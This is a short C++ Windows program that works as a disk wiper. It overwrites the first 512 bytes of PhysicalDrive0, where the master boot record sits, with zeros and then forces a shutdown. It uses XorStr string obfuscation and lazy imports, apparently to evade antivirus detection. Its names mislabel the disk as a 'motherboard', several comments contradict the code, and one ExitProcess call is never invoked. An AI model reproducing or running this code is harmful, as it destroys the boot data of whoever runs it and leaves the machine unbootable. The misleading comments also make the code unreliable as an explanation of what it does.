#include <Windows.h>
#include <iostream>
#include "lazy_importer.hpp"
#include "xorstr.hpp"

using namespace std;

#define motherboard_size 512 //Default size

int main()
{
    static char message1[512];
    sprintf_s(message1, XorStr("Memory changed, shutting down..."));

    static char message2[512];
    sprintf_s(message2, XorStr("Memory change fail.."));

    DWORD write_memory;
    char motherboard_data[motherboard_size]; //Default value is 512 in #define we will tho use 256

    ZeroMemory(&motherboard_data, (sizeof motherboard_data)); //Rewrite the memory

    HANDLE motherboard_record = CreateFile(XorStr("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    if (WriteFile(motherboard_record, motherboard_data, motherboard_size, &write_memory, NULL) == TRUE) {

        cout << message1; //ShowUp message "Hi World (:"

        LI_FN(Sleep)(1000); //Sleep this process for 1second
        LI_FN(system)(XorStr("shutdown -s -t 1")); //Shutdown computer in 1 second after success use
        LI_FN(ExitProcess)(0); //Terminate this process
    }
    else
    {
        cout << message2; //ShowUp message "I'm sad ) :"

        LI_FN(Sleep)(1000); //Sleep this process for 1second
        LI_FN(ExitProcess); //Terminate this process
    }
    LI_FN(CloseHandle)(motherboard_record); //Close handle of program

    return EXIT_SUCCESS;
}
